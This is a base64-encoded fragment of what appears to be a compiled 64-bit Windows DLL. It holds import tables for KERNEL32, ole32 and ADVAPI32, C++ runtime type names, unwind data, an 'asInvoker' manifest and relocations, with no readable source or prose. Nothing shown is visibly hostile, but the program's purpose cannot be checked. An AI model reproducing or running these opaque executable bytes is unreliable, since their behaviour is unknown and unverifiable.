AB+KAIAAAAAAIooAgAAAAAAnigCAAAAAACuKAIAAAAAAMAoAgAAAAAA1igCAAAAAADkKAIAAAAAAPwoAgAAAAAADCkCAAAAAAA0KQIAAAAAAEApAgAAAAAATikCAAAAAABcKQIAAAAAAGYpAgAAAAAAeCkCAAAAAACQKQIAAAAAAKgpAgAAAAAAwCkCAAAAAADOKQIAAAAAAOQpAgAAAAAA8CkCAAAAAAD8KQIAAAAAAAwqAgAAAAAAHCoCAAAAAAAqKgIAAAAAADQqAgAAAAAARioCAAAAAABSKgIAAAAAAF4qAgAAAAAAeCoCAAAAAACSKgIAAAAAAKQqAgAAAAAAtioCAAAAAADIKgIAAAAAANoqAgAAAAAA7ioCAAAAAAD6KgIAAAAAAAAAAAAAAAAAFgAAAAAAAIAVAAAAAAAAgA8AAAAAAACAEAAAAAAAAIAaAAAAAAAAgJsBAAAAAACACQAAAAAAAIAIAAAAAAAAgAYAAAAAAACAAgAAAAAAAIAAAAAAAAAAAKgmAgAAAAAAliYCAAAAAAAAAAAAAAAAAEEDTG9hZExpYnJhcnlXAABMAkdldFByb2NBZGRyZXNzAABoAUZyZWVMaWJyYXJ5AHoCR2V0U3lzdGVtSW5mbwBmBFNldEVycm9yTW9kZQAAS0VSTkVMMzIuZGxsAABDAENvSW5pdGlhbGl6ZUV4AABwAENvVW5pbml0aWFsaXplAABvbGUzMi5kbGwAT0xFQVVUMzIuZGxsAAAYBFJ0bENhcHR1cmVDb250ZXh0AB8EUnRsTG9va3VwRnVuY3Rpb25FbnRyeQAAJgRSdGxWaXJ0dWFsVW53aW5kAADiBFVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgAAswRTZXRVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIAxgFHZXRDdXJyZW50UHJvY2VzcwDOBFRlcm1pbmF0ZVByb2Nlc3MAAAYDSXNQcm9jZXNzb3JGZWF0dXJlUHJlc2VudACpA1F1ZXJ5UGVyZm9ybWFuY2VDb3VudGVyAMcBR2V0Q3VycmVudFByb2Nlc3NJZADLAUdldEN1cnJlbnRUaHJlYWRJZAAAgAJHZXRTeXN0ZW1UaW1lQXNGaWxlVGltZQDvAkluaXRpYWxpemVTTGlzdEhlYWQAAgNJc0RlYnVnZ2VyUHJlc2VudABqAkdldFN0YXJ0dXBJbmZvVwAeAkdldE1vZHVsZUhhbmRsZVcAAAgCR2V0TGFzdEVycm9yAABpA011bHRpQnl0ZVRvV2lkZUNoYXIAIAVXaWRlQ2hhclRvTXVsdGlCeXRlAEoDTG9jYWxGcmVlACEEUnRsUGNUb0ZpbGVIZWFkZXIA7gBFbmNvZGVQb2ludGVyALQDUmFpc2VFeGNlcHRpb24AABoCR2V0TW9kdWxlRmlsZU5hbWVXAAAlBFJ0bFVud2luZEV4APECSW50ZXJsb2NrZWRGbHVzaFNMaXN0AIAEU2V0TGFzdEVycm9yAADrAkluaXRpYWxpemVDcml0aWNhbFNlY3Rpb25BbmRTcGluQ291bnQA0wRUbHNBbGxvYwAA1QRUbHNHZXRWYWx1ZQDWBFRsc1NldFZhbHVlANQEVGxzRnJlZQBAA0xvYWRMaWJyYXJ5RXhXAADyAEVudGVyQ3JpdGljYWxTZWN0aW9uAAA7A0xlYXZlQ3JpdGljYWxTZWN0aW9uAADSAERlbGV0ZUNyaXRpY2FsU2VjdGlvbgAfAUV4aXRQcm9jZXNzAB0CR2V0TW9kdWxlSGFuZGxlRXhXAADXAkhlYXBGcmVlAADTAkhlYXBBbGxvYwAvA0xDTWFwU3RyaW5nVwAAawJHZXRTdGRIYW5kbGUAAPoBR2V0RmlsZVR5cGUAbgFHZXRBQ1AAAAwDSXNWYWxpZENvZGVQYWdlAD4CR2V0T0VNQ1AAAHgBR2V0Q1BJbmZvAOEBR2V0RW52aXJvbm1lbnRTdHJpbmdzVwAAZwFGcmVlRW52aXJvbm1lbnRTdHJpbmdzVwBRAkdldFByb2Nlc3NIZWFwAACMAUdldENvbW1hbmRMaW5lQQCNAUdldENvbW1hbmRMaW5lVwBwAkdldFN0cmluZ1R5cGVXAABdAUZsdXNoRmlsZUJ1ZmZlcnMAADQFV3JpdGVGaWxlAKABR2V0Q29uc29sZUNQAACyAUdldENvbnNvbGVNb2RlAACUBFNldFN0ZEhhbmRsZQAA3AJIZWFwU2l6ZQAA2gJIZWFwUmVBbGxvYwBSAENsb3NlSGFuZGxlAHUEU2V0RmlsZVBvaW50ZXJFeAAAMwVXcml0ZUNvbnNvbGVXAI8AQ3JlYXRlRmlsZVcA8QJTeXN0ZW1GdW5jdGlvbjAzNgBBRFZBU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